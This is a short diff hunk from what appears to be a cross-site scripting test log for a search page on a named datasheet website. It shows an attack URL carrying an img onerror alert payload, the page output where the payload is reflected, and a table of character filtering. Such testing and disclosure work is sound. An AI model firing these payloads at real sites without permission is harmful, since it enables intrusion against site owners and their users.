@@ -83,7 +83,7 @@ HTML Attack Url: https://www.datasheet4u.com/search.php?sWord=<img src=x onerror
 FINAL OUTPUT: 
 <img src=x onerror="alert`1`"> circuit, <img src=x onerror="alert`1`"> datenblatt, block diagram, schematic, Datasheet4U.com</title>
 <font color="red"><img src=x onerror="alert`1`"></font>
-	Script-Single	Encapsulated With Double Quotes: Can't Break the Context
+	Script-Single , 	Encapsulated With Double Quotes: Can't Break the Context
 Mitigation        "	'	<	/ 
 SCRIPT:		True	False	False	False
 
